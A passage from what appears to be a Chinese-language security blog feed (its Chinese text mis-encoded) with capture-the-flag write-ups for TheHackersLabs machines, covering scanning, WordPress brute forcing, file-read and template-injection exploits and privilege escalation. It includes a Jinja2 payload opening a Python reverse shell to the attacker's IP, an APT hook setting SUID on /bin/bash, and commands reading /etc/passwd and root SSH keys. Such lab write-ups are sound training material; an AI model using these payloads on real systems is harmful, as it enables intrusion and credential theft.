![image](https://github.com/user-attachments/assets/d2ff7f6f-34e7-4931-885f-74ce45c5b96e)

![image](https://github.com/user-attachments/assets/d618e2ae-0b45-4a3c-856d-5d24b5838035)

ÈÄöËøáÂà©Áî®WrapWrapÊºèÊ¥ûÔºåÊûÑÈÄ†ÊîªÂáªÔºö

```
git clone https://github.com/ambionics/wrapwrap.git
git clone https://github.com/cfreal/ten.git
cd ten
python3 -m venv ./venv
source ./venv/bin/activate
pip install .
python3 wrapwrap.py /etc/passwd '{'message':'' ''}' 1300
python3 -m http.server 9000
```

![image](https://github.com/user-attachments/assets/8fa3956f-d1ea-40cf-8659-ecb8a3a52f04)

ÁúãÁúã‰ªñÊèêÁ§∫ÁöÑÊ≥ÑÊºè‰ø°ÊÅØÊòØ‰ªÄ‰πà

```
python3 wrapwrap.py /var/www/examen.thlcpptv16.thl/wp-config.php  '{'message':'' ''}' 1300
```

![image](https://github.com/user-attachments/assets/08eb3101-eae7-4d76-b161-a2923014f797)

ÊàêÂäüÈÄöËøá `wrapwrap.py` Ëé∑Âèñ tom ÂØÜÁ†Å„ÄÇ

# 6.SSH ÁôªÂΩï‰∏éÊèêÊùÉ

Êü•Áúã tom ÂÆ∂ÁõÆÂΩï‰∏ãÁöÑÊïèÊÑü‰ø°ÊÅØ

![image](https://github.com/user-attachments/assets/abb3f249-2485-4f6e-ac74-4ad80a8b5dea)

```
cat ./bashrc
```

![image](https://github.com/user-attachments/assets/f94ac21e-1b78-43cf-83e2-d562255805d3)

ÂèëÁé∞‰∏Ä‰∏™ rafael Áî®Êà∑ÁöÑÂ∏êÂè∑ÂíåÂØÜÁ†Å

![image](https://github.com/user-attachments/assets/65b15b69-d3a3-47d4-888a-918e43705fb3)

Âú®/var/backup/ÁõÆÂΩï‰∏äÂèëÁé∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ **passwd.dll** ÁöÑÊñá‰ª∂ÔºåÂ±û‰∫éÁî®Êà∑ `jerry`„ÄÇËôΩÁÑ∂ÂÜÖÂÆπÊòØÂèØËØªÁöÑÔºå‰ΩÜ‰ºº‰πé‰ΩøÁî®‰∫ÜÊüêÁßçÁºñÁ†Å„ÄÇ
ÊúÄÂêéÈÄöËøá‰ΩøÁî®rot13Ëß£Á†ÅËé∑ÂæóÂÖ∂ÂÜÖÂÆπËøõË°åËß£Á†ÅÔºåÊàêÂäüËé∑Âèñ‰∫Ü `jerry` Áî®Êà∑ÁöÑ SSH ÂØÜÈí•

&gt; [!IMPORTANT]
&gt; https://rot13.com/

Êúâ‰∫ÜËøô‰∫õÂá≠ËØÅÔºåÊàë‰ª¨Ë¶ÅÂÅöÁöÑÁ¨¨‰∏Ä‰ª∂‰∫ãÂ∞±ÊòØËøõÂÖ• Rafael ÁöÑÊú∫Âô®„ÄÇ

![image](https://github.com/user-attachments/assets/587d5b54-120a-41f7-9358-20f254f98481)

Êü•Áúã sudo ÊùÉÈôêÁúãÁúãÊúâÊ≤°ÊúâÊÉäÂñú

![image](https://github.com/user-attachments/assets/6f8a870e-d91e-45b6-a838-32bbd15fcdcc)

vim ÊèêÊùÉÊúâÂæàÂ§öÊñπÂºèÔºåÂèØ‰ª•ÈÄöËøá gtfobinsÊü•ÁúãÔºåÊàëÁöÑÊñπÂºèÊòØËøõÂÖ• vim ÁÑ∂ÂêéËøõÂÖ•ÂëΩ‰ª§Ê®°Âºè,`!/bin/bash` ÊèêÊùÉ

&gt; [!IMPORTANT]
&gt; https://gtfobins.github.io/

ÂÖ∑‰ΩìÂ∞±ÊòØÂÖàËæìÂÖ• `:` ÂÜçËæìÂÖ• `!/bin/bash`

# 7.VPN ÈößÈÅì‰∏éËøõ‰∏ÄÊ≠•Ê∏óÈÄè

Êü•Áúã `Ê†π` ÁõÆÂΩïÔºåÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `tunnelRafael.conf` ÁöÑÊñá‰ª∂ÔºåÂÆÉ‰∏é VPNÔºàËôöÊãü‰∏ìÁî®ÁΩëÁªúÔºâÂ∑•ÂÖ∑ WireGuard ÁöÑÂÖ∏ÂûãÈÖçÁΩÆÁõ∏ÂåπÈÖç„ÄÇ

![image](https://github.com/user-attachments/assets/e53b5f4b-799e-44cb-86b5-bebcbe269a2a)

ÂÖà‰ΩøÁî®Ligolo-NGÊääÈößÈÅìÂª∫Á´ã‰∏Ä‰∏ã

&gt; [!IMPORTANT]
&gt; https://github.com/nicocha30/ligolo-ng

```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.101.0.0/28 dev ligolo
./ligolo-agent -connect 192.168.205.141:11601 -ignore-cert
ligolo-proxy -selfcert
```

Áé∞Âú®Êàë‰ª¨Â∑≤Áªè‰ΩøÁî®‰ª£ÁêÜÊâãÊÆµÂú®ÁõÆÊ†áÁΩëÁªúÂÜÖ‰∫ÜÔºåÁÑ∂ÂêéÈÄöËøá WireGuard ËøûÊé• VPNÔºàËøôÈáåËÆ∞ÂæóÊää `tunnelRafael.conf` ÊâòÂà∞ÊîªÂáªÊú∫Ôºâ

```
sudo apt install wireguard-tools resolvconf
wg-quick up tunnelRafael.conf
```

![image](https://github.com/user-attachments/assets/bf6081a9-6418-4531-ba38-ecf7af7afbfb)

Âª∫Á´ãÊàêÂäüÔºåÁΩëÊÆµ‰∏∫ 10.13.13.0/24

Êâ´ÊèèÂà∞ÈÄöËøá VPN Âª∫Á´ãÁöÑÂ≠êÁΩë **10.13.13.0/24**

```
fping -asgq 10.13.13.0/24
```

![image](https://github.com/user-attachments/assets/53939c0f-4585-4095-9e62-4b4d3b66c8b8)

Ê†πÊçÆÊé®ÊµãÂèØ‰ª•ÁúãÂá∫Â∫îËØ•ÊòØ 10.13.13.3ÔºåÊâ´Êèè‰∏Ä‰∏ã 22 Á´ØÂè£ÊòØ‰∏çÊòØÂºÄÊîæÁöÑÔºåÂõ†‰∏∫Êàë‰ª¨ËøòÊúâ‰∏Ä‰∏™ `jerry` Áî®Êà∑‰ø°ÊÅØÊ≤°Áî®Ëøá

```
nmap -p22 -Pn 10.13.13.3
```

![image](https://github.com/user-attachments/assets/22fc3b72-3125-4a48-954d-3828b7e2d389)

Á°ÆÂÆûÊòØÂºÄÊîæÁöÑÔºåËøûÊé•‰∏äÂéª

![image](https://github.com/user-attachments/assets/5775c59b-9752-47a6-aae0-e17ac45e9efa)

Áî©‰∫Ü‰∏Ä‰∏™ Linpeas ËÑöÊú¨,Êàë‰ª¨ÂæóÁü•Áî®Êà∑ `jerry` Â±û‰∫é `sistema` ÁªÑÔºå‰ªñËÉΩÂ§üÂÜôÂÖ• `/etc/apt/apt.conf.d`ÔºåÈÇ£Êàë‰ª¨ÂèØ‰ª•Âú®Êõ¥Êñ∞ËΩØ‰ª∂ÂåÖ‰ΩøÁî® APT ÂëΩ‰ª§‰øÆÊîπ bash ÊùÉÈôê„ÄÇ

```
echo 'APT::Update::Pre-Invoke:: {'chmod u+s /bin/bash'};' &gt; /etc/apt/apt.conf.d/01ab
```

![image](https://github.com/user-attachments/assets/5dd2d63a-355a-4480-a0ba-da2cbdf81215)

ÊâæÂà∞‰∫Ü **jerry** Âá≠ËØÅÔºå‰ΩøÁî®Ëøô‰∏™Âá≠ËØÅÂÜçÈáçÊñ∞ËøûÊé•‰∏ª ip

![image](https://github.com/user-attachments/assets/5b778922-ef9e-4af3-b23d-d2a28a2f7b02)

Êü•Áúã sudo ÊùÉÈôêÂèØ‰ª•ÁúãÂà∞Êàë‰ª¨ÂèØ‰ª•**‰ª• root Ë∫´‰ªΩËøêË°å nginxÔºå**  ÈÄöËøá google ÊêúÁ¥¢ÂèØ‰ª•ÂèëÁé∞‰∏Ä‰∏™ÂÖ≥‰∫énginx ÁöÑÊºèÊ¥û

&gt; [!IMPORTANT]
&gt; https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406

```
./exploit.sh
ssh -i /home/jerry/.ssh/id\_rsa root@127.0.0.1
```

Êãø‰∏ã rootsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_THLCPPT_V16-bi-ji.html</guid><pubDate>Fri, 27 Jun 2025 09:34:01 +0000</pubDate></item><item><title>thl_sinplomo98Á¨îËÆ∞</title><link>https://7r1UMPHK.github.io/post/thl_sinplomo98-bi-ji.html</link><description># thl_sinplomo98Á¨îËÆ∞

**Èù∂Êú∫**Ôºöhttps://thehackerslabs.com/sinplomo98/
**ÈöæÂ∫¶**ÔºöÈ´òÁ∫ßÔºàAVANZADOÔºâ
**ÊîªÂáªip**:192.168.205.141
**Èù∂Êú∫ip**:192.168.205.157

# 1.Á´ØÂè£Êâ´Êèè

È¶ñÂÖà‰ΩøÁî®`nmap`Êâ´ÊèèÁõÆÊ†áÊú∫Âô®ÁöÑÂºÄÊîæÁ´ØÂè£Ôºö

```
nmap 192.168.205.157
```

![image](https://github.com/user-attachments/assets/35d20d5f-2eb5-461b-a2aa-e2ff6bcdff3f)

ÈÄöËøáÊâ´ÊèèÔºåÂèëÁé∞ÁõÆÊ†áÊú∫Âô®‰∏äÂºÄÊîæ‰∫ÜÂ§ö‰∏™Á´ØÂè£ÔºåÂÖ∂‰∏≠21Á´ØÂè£ÔºàFTPÊúçÂä°ÔºâÂíå5000Á´ØÂè£ÔºàWebÊúçÂä°ÔºâÊàëÊØîËæÉÊÑüÂÖ¥Ë∂£„ÄÇ
ÂÖàÁúã21 ftpÊúçÂä°

# 2. FTPÊúçÂä°Êé¢Êµã

```
ftp 192.168.205.157

#‰ΩøÁî®ÂåøÂêçÁôªÂΩï
anonymous 
anonymous

ls
mget supermegaultraimportantebro.txt
cat supermegaultraimportantebro.txt
```

![image](https://github.com/user-attachments/assets/0a02e140-b0df-406b-bd17-2251aa43f2ea)
ÂëµÔºÅÂ∞±‰∏ç[ÁãóÂ§¥]

# 3. WebÊúçÂä°Êé¢Êµã

Êé•‰∏ãÊù•ÔºåËÆøÈóÆÁõÆÊ†áÁöÑ80Á´ØÂè£ÔºåËøõË°åÊ®°Á≥äÊµãËØïÔºå‰ΩÜÊú™ËÉΩÂèëÁé∞‰ªÄ‰πàÊúâÁî®ÁöÑ‰ø°ÊÅØ„ÄÇÁªßÁª≠Êé¢Êµã5000Á´ØÂè£ÔºåÂèëÁé∞ÊòØWebÊúçÂä°„ÄÇ

ÁúãÁúãÊ∫ê‰ª£Á†ÅÊúâÊ≤°ÊúâÊèêÁ§∫

![image](https://github.com/user-attachments/assets/ff805305-85d4-4c31-8d64-2dc135498bc4)

Ê†πÊçÆÈ°µÈù¢ÁöÑÊèêÁ§∫ÔºåÂä†‰∏äË∑ØÂæÑÊµãËØï„ÄÇ

![image](https://github.com/user-attachments/assets/fb34ab9b-90d7-4373-beb6-04948a83a1f0)

# 4.SSTIÂà©Áî®

ÁªèÊµãËØïÔºåÁ°ÆËÆ§ËØ•WebÊúçÂä°Â≠òÂú®Server-Side Template InjectionÔºàSSTIÔºâÊºèÊ¥û
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
Â∞ùËØïÊâßË°åÂü∫Êú¨ÁöÑÊ®°ÊùøËØ≠Ê≥ïÔºö

```
{{8*8}}
```

ÈÄöËøá‰ª•‰∏ãpayloadÊâßË°åËøúÁ®ãÂëΩ‰ª§Ôºö

```
{% for x in [].__class__.__base__.__subclasses__() %}
    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'exec' in x.__init__.__globals__['__builtins__']['exec'].__name__ %}
        {{ x.__init__.__globals__['__builtins__']['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.205.141',8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('bash')')}}
    {% endif %}
{% endfor %}

```

# 5. ÊùÉÈôêÊèêÂçá

‰ΩøÁî®LinpeasËÑöÊú¨ËøõË°åÊùÉÈôêÊèêÂçáÊ£ÄÊü•ÔºåÂèëÁé∞ÁõÆÊ†áÁ≥ªÁªüÂ±û‰∫édiskÁªÑÂπ∂Â≠òÂú®SUIDÊèêÂèñÊºèÊ¥û„ÄÇ

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group)

```
#Êü•ÁúãÁ≥ªÁªüÂàÜÂå∫ÂíåÊñá‰ª∂Á≥ªÁªü‰ø°ÊÅØ
df -h
#‰ΩøÁî®debugfsÊü•ÁúãÊñá‰ª∂
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
```

ÈÄöËøáÊãøÂà∞id_rsaÊñá‰ª∂ÂêéÔºå‰ΩøÁî®JohnËøõË°åÁàÜÁ†¥ÔºåÊúÄÁªàËé∑ÂèñrootÊùÉÈôê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_sinplomo98-bi-ji.html</guid><pubDate>Fri, 27 Jun 2025 09:33:59 +0000</pubDate></item><item><title>thl_Offensive</title><link>https://7r1UMPHK.github.io/post/thl_Offensive.html</link><description># thl_Offensive

**Èù∂Êú∫**Ôºö[thehackerslabs - offensive](https://thehackerslabs.com/offensive/)
**ÈöæÂ∫¶**Ôºö‰∏ì‰∏öÔºàPROFESIONALÔºâ
**ÁõÆÊ†á IP**Ôºö192.168.205.220
**Êú¨Êú∫ IP**Ôºö192.168.205.141

---

## 1. Á´ØÂè£Êûö‰∏æÂèäÊúçÂä°Êé¢Êµã

È¶ñÂÖàÔºå‰ΩøÁî® `nmap` Êâ´ÊèèÁõÆÊ†á IP ÁöÑÂºÄÊîæÁ´ØÂè£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sV -sT -O -Pn -n -p- 192.168.205.220
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 11:32 CST
Nmap scan report for 192.168.205.220
Host is up (0.00034s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
8080/tcp open  http    Node.js Express framework
MAC Address: 08:00:27:B1:A8:86 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.68 seconds
```

‰ªé `nmap` Êâ´ÊèèÁªìÊûúÊù•ÁúãÔºåÁõÆÊ†áÊú∫Âô®ÂºÄÊîæ‰∫Ü **22** (SSH) „ÄÅ **80** (HTTP) Á´ØÂè£„ÄÅ**8080**(HTTP) Á´ØÂè£„ÄÇ

ÂÖ∂‰∏≠80ÊòØ**Apache httpd 2.4.62**ÁöÑÊúçÂä°Ôºå8080ÊòØ**Node.js Êû∂ÊûÑ**ÔºåÊàë‰ª¨‰∏äÂéªÁΩëÈ°µÁúãÁúã

---

## 2.Ë∏©ÁÇπ

### 80Á´ØÂè£

![image](https://github.com/user-attachments/assets/819ee2bc-b088-4fae-bf3a-085e6092abf4)

ÊòéÊòæÂèØ‰ª•ÁúãÂá∫Êúâ‰∏Ä‰∏™ÂüüÂêç`offensive.thl`Âä†ÂÖ•Êàë‰ª¨ÁöÑhostsÊñá‰ª∂‰∏≠ÔºåÁªßÁª≠Ë∏©ÁÇπÂèØ‰ª•ÂèëÁé∞ÔºåËøô‰∏™ÁΩëÈ°µÊòØ‰∏™ÂçöÂÆ¢ÔºåÈÇ£Êàë‰ª¨Êé¢Êµã‰∏Ä‰∏ãÊû∂ÊûÑ„ÄÇ

```bash
‚îî‚îÄ$ whatweb http://offensive.thl/       
http://offensive.thl/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.205.220], MetaGenerator[WordPress 6.7.1], Script, Title[rodgar], UncommonHeaders[link], WordPress[6.7.1]

```

ÊòØ**WordPress 6.7.1**ÁöÑÔºåÊàë‰ª¨Âà©Áî®**wpscan**ËøõË°åÊé¢Êµã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wpscan --url http://offensive.thl -e vp,u --api-token xxx   #api-tokenÊ≥®ÂÜåwpscanÂÆòÁΩëËé∑Âèñ
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ¬Æ
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://offensive.thl/ [192.168.205.220]
[+] Started: Wed Jan  1 12:51:58 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.62 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://offensive.thl/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
 |  - http://offensive.thl/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;

[+] WordPress theme in use: gentlemens-club
 | Location: http://offensive.thl/wp-content/themes/gentlemens-club/
 | Latest Version: 1.0.0 (up to date)
 | Last Updated: 2024-09-25T00:00:00.000Z
 | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css
 | Style Name: Gentlemen's Club
 | Description: Theme with a simple design, extremely linear and clean. A space reserved for the private club. The p...
 | Author: masino1967
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: 'Version: 1.0.0'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;=========================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] administrator
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://offensive.thl/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 0
 | Requests Remaining: 19

[+] Finished: Wed Jan  1 12:52:18 2025
[+] Requests Done: 56
[+] Cached Requests: 8
[+] Data Sent: 11.653 KB
[+] Data Received: 288.726 KB
[+] Memory used: 268.75 MB
[+] Elapsed time: 00:00:19
                                                  
```

Ëé∑Âæó‰∏Ä‰∏™Áî®Êà∑Âêç`administrator`ÔºåÂ∞±Ê≤°ÊúâÂÖ∂‰ªñÈáçË¶ÅÁöÑ‰ø°ÊÅØ‰∫ÜÔºåÊàë‰ª¨ËøõË°åÁàÜÁ†¥‰∏Ä‰∏ãÂØÜÁ†Å

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wpscan --url http://offensive.thl -U administrator -P /usr/share/wordlists/rockyou.txt --api-token xxx   #api-tokenÊ≥®ÂÜåwpscanÂÆòÁΩëËé∑Âèñ
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ¬Æ
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://offensive.thl/ [192.168.205.220]
[+] Started: Wed Jan  1 12:54:01 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.62 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://offensive.thl/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
 |  - http://offensive.thl/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;

[+] WordPress theme in use: gentlemens-club
 | Location: http://offensive.thl/wp-content/themes/gentlemens-club/
 | Latest Version: 1.0.0 (up to date)
 | Last Updated: 2024-09-25T00:00:00.000Z
 | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css
 | Style Name: Gentlemen's Club
 | Description: Theme with a simple design, extremely linear and clean. A space reserved for the private club. The p...
 | Author: masino1967
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: 'Version: 1.0.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 &lt;========================================================&gt; (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[i] Could not find a login interface to perform the password attack against

[i] No Valid Passwords Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 0
 | Requests Remaining: 18

[+] Finished: Wed Jan  1 12:54:04 2025
[+] Requests Done: 142
[+] Cached Requests: 39
[+] Data Sent: 29.128 KB
[+] Data Received: 21.362 KB
[+] Memory used: 245.344 MB
[+] Elapsed time: 00:00:03
                   


[i] Could not find a login interface to perform the password attack against

[i] Êó†Ê≥ïÊâæÂà∞ÁôªÂΩïÁïåÈù¢Êù•ÊâßË°åÂØÜÁ†ÅÊîªÂáª
```

‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÊâæ‰∏çÂà∞ÔºåÊàë‰πüÊó†Ê≥ïËÆøÈóÆÁôªÂΩïÁÇπÔºåÈÇ£Êàë‰ª¨ÂéªÊé¢Êµã‰∏Ä‰∏ã**8080**Á´ØÂè£Âêß„ÄÇ

ÊâìÂºÄÁΩëÂùÄÔºå‰ªñËØ¥Êó†Ê≥ïGET /	ÊÄé‰πàÁúãËµ∑Êù•ÂÉèAPIÂëÄÔºåÁõÆÂΩïÁàÜÁ†¥‰∏Ä‰∏ã„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://offensive.thl:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://offensive.thl:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/help                 (Status: 200) [Size: 203]
/cat                  (Status: 500) [Size: 31]
/Help                 (Status: 200) [Size: 203]
/ls                   (Status: 200) [Size: 176]
/rm                   (Status: 500) [Size: 45]
/Cat                  (Status: 500) [Size: 31]
Progress: 49633 / 6369165 (0.78%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 51095 / 6369165 (0.80%)
===============================================================
Finished
===============================================================

```

Êü•Áúã‰∏Ä‰∏ãÂ∏ÆÂä©„ÄÇ

![image](https://github.com/user-attachments/assets/aa4bd96d-99b6-4f0c-b204-76a776e4eddb)

ÂèØ‰ª•‰∏ãËΩΩ„ÄÅÊü•Áúã„ÄÅÂà†Èô§Ôºå‰ΩÜÊòØÈôêÂà∂Âú®`/var/www`ÔºåÈÇ£Êàë‰ª¨Êü•Áúã‰∏Ä‰∏ãÊúâ‰ªÄ‰πàÊñá‰ª∂„ÄÇ

![image](https://github.com/user-attachments/assets/82d60f3a-df63-4105-b95a-8121ca79dea5)

ÊúâÊÑèÊÄùÔºåÊàë‰ª¨ÁúãÁúã**wordress**‰∏≠ÊúâÊ≤°ÊúâÊàë‰ª¨Ê≤°ÊúâÊé¢ÊµãÂá∫Êù•ÁöÑ**plugins**„ÄÇ

![image](https://github.com/user-attachments/assets/4bd23546-7d72-4ac2-9b55-f3d7b2fa032a)

ÁúüÂ§öÂïäÔºåÊàëÊØîËæÉÂØπ`akismet`„ÄÅ`wps-hide-login`„ÄÅ`wpterm`ÊÑüÂÖ¥Ë∂£ÔºåÊêúÁ¥¢‰∏Ä‰∏ã‰ªñ‰ª¨ÊúâÊ≤°ÊúâÊºèÊ¥û„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ searchsploit akismet
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Akismet - Multiple Cross-Site Scripting Vulnerabilities                             | php/webapps/37902.php
WordPress Plugin Akismet 2.1.3 - Cross-Site Scripting                                                | php/webapps/30036.html
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ searchsploit wps-hide-login 
Exploits: No Results
Shellcodes: No Results
                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ searchsploit wpterm     
Exploits: No Results
Shellcodes: No Results
                                
```

Âè™Êúâ‰∏Ä‰∏™Ë∑®Á´ôÁÇπÔºåÊàë‰ª¨Áî®‰∏ç‰∏äÔºå‰ΩÜÊòØÊàëÂèëÁé∞‰∫ÜÁÇπÈóÆÈ¢òÔºå`wps-hide-login`ÊòØ‰ªÄ‰πà‰∏úË•øÂïäÔºåËß¶Âèë‰∫ÜÊàëÂÖ≥ÈîÆËØçÔºåÊêúÁ¥¢‰∏Ä‰∏ã„ÄÇ

![image](https://github.com/user-attachments/assets/a014b2ce-d98a-4762-b648-65d6dbdb956b)

ÂéüÊù•Â∞±ÊòØ‰Ω†ËÆ©ÊàëÁàÜÁ†¥‰∏ç‰∫Ü[ÁîüÊ∞î]ÔºåËøõ‰Ω†ÁõÆÂΩïÁúãÁúã„ÄÇ

![image](https://github.com/user-attachments/assets/40a293ec-8fc3-474b-92fe-4d19af4a276f)

ÂæóÂà∞‰∫Ü‰∏Ä‰∏™ÁâàÊú¨Âè∑ÔºåÊàëÂéªÊêúÁ¥¢‰∫Ü‰∏Ä‰∏ã`wps-hide-login`ÁöÑexploitÔºåÊ≤°ÊúâËøô‰∏™ÁâàÊú¨ÁöÑÔºåËøô‰∏™ÊòØÊúÄÊñ∞ÁâàÔºåÈöæÂäû‰∫Ü......

ÊàëÂøΩÁÑ∂ÊÉ≥Âà∞‰∏Ä‰∏™ÈóÆÈ¢òÔºå‰ª•ÂâçÊê≠ÂçöÂÆ¢Âä†Êèí‰ª∂ÁöÑËØùÔºåÂ¶ÇÊûúÈÇ£‰∏™Êèí‰ª∂‰∏çË¶Å‰∫ÜÔºåÁõ¥Êé•ÊääÈÇ£‰∏™ÁõÆÂΩïÂà†‰∫ÜÂÆÉÂ∞±‰ºöÊ∂àÂ§±ÔºåÊàë‰∏çÁü•ÈÅì**WordPress**ÊòØ‰∏çÊòØËøôÁßçÊú∫Âà∂ÔºåËØïËØïÂêßÔºå‰∏çË°åÂ∞±ÈáçË£Ö

![image](https://github.com/user-attachments/assets/ab524259-acc2-4c3f-820e-620e26da7e1b)

Â∞ùËØïÂèØ‰∏çÂèØ‰ª•ÁôªÂΩï„ÄÇ

![image](https://github.com/user-attachments/assets/b6592349-bf94-430b-ad0c-214e4b453084)

ËøòÁúüË°åÔºåÂÜçÁàÜÁ†¥‰∏ÄÊ¨°ÂØÜÁ†Å„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
